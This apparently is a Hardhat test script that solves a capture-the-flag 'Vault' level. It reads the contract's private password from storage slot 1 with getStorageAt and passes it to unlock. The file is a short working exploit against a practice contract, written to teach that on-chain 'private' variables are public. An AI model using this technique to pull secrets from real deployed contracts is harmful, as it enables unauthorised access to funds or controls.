import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Vault`);
  const challengeAddress = await createChallenge(
    `0xf94b476063B6379A3c8b6C836efB8B3e10eDe188`
  );
  challenge = await challengeFactory.attach(challengeAddress);

//  const attackerFactory = await ethers.getContractFactory(`YourAttackerSourceFile`);
//  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
  let provider: any = eoa.provider;
  console.log(await provider.getCode(challenge.address));
  const password = await provider.getStorageAt(challenge.address, 1);
  console.log("storage slot 1", password);
  console.log(`password = hex: ${password}, ascii: "${Buffer.from(password.slice(2), `hex`)}"`)
  await challenge.unlock(password);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
